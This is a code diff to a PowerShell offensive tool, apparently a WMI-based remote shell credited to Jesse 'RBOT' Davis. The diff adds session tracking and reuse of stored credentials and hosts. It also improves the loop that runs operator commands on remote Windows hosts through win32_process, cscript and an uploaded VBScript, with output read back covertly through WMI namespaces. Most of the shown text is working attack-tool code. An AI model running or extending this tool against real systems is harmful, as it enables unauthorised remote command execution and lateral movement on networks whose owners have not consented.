@@ -135,28 +135,54 @@ Author : Jesse "RBOT" Davis
 		}
 	}
 	
-	END {Write-Host -ForegroundColor Green $wmiOn.ComputerName
-         Write-Host -ForegroundColor Yellow $wmiOff}
+	END {
+    Write-Host -ForegroundColor Green "WMI Shells successfully setup on $($wmiOn.Length) host(s)"
+    Write-Host -ForegroundColor Yellow "WMI Shells failed on $($wmiOff.Length) host(s)"
+    $Global:WmiShells = $wmiOn
+    }
+}
+
+function List-WmiShells{
+
+#[CmdLetBinding()]
+
+    foreach($entry in $Global:WmiShells) {
+        If ([BOOL]$entry.ReadCount) {
+            Write-Host -ForegroundColor Cyan "Session $($entry.ReadCount) = $($entry.ComputerName)"
+        }
+        else {Write-Host -ForegroundColor Cyan "Session 0 = $($entry.ComputerName)"}
+    }
+
 }
 function Enter-WmiShell{
 
-[CmdLetBinding()]
+[CmdLetBinding(DefaultParameterSetName = "set1")]
 
 	Param (
-		[Parameter(Mandatory = $True,
+        [Parameter(ParameterSetName = "set1")]
+        [string]$Session,		
+        [Parameter(ParameterSetName = "set2",
+                   Mandatory = $True,
 				   ValueFromPipeline = $True,
 				   ValueFromPipelineByPropertyName = $True)]
 		[string[]]$ComputerName,
-		[Parameter()]
+		[Parameter(ParameterSetName = "set2")]
         [ValidateNotNull()]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
-		[Parameter(Mandatory = $True)]
+		[Parameter(ParameterSetName = "set2", Mandatory = $True)]
 		[string]$UploadTo,
-		[Parameter(Mandatory = $True)]
-		[ValidateSet("Base64", "Hex")]
-		[string]$Encoding
+		[Parameter(ParameterSetName = "set2", Mandatory = $True)]
+		[string]$vbsName
 	) #End Param
+        
+        if ($Session) {
+            $ComputerName = $Global:Wmishells[$Session].ComputerName
+            $UserName = $Global:WmiShells[$Session].Credentials
+            $UploadTo = $Global:WmiShells[$Session].vbsLocation
+            $vbsName = $Global:WmiShells[$Session].vbsName
+            $Encoding = $Global:Wmishells[$Session].Encoding
+        }
 
         # Drop into WmiShell prompt
         $command = [NullString]::Value
@@ -173,7 +199,7 @@ function Enter-WmiShell{
             # Execute commands on remote host using cscript.exe and uploaded VBScript
             $cScript = "cmd.exe /c cscript.exe $($UploadTo)\$($vbsName) `"$($command)`""
             iwmi -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $cScript | Out-Null
-            
+            Start-Sleep -s 1
             if ($command -ne "exit") {
 
                 # Wait for vbScrpit to finish writing output to WMI namespaces
@@ -182,12 +208,12 @@ function Enter-WmiShell{
                 until($outputReady)
 
                 # Retrieve cmd output written to WMI namespaces 
-                Get-WmiShellOutput -Credential $UserName -ComputerName $ComputerName -Encoding $Encoding
+                Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Encoding $Encoding
             }
         }until($command -eq "exit")
 
-        $a.BackgroundColor = "DarkMagenta"
-        Clear-Host
+        $a.BackgroundColor = "DarkBlue"
+        #Clear-Host
 }
 function Get-WmiShellOutput{
 <#
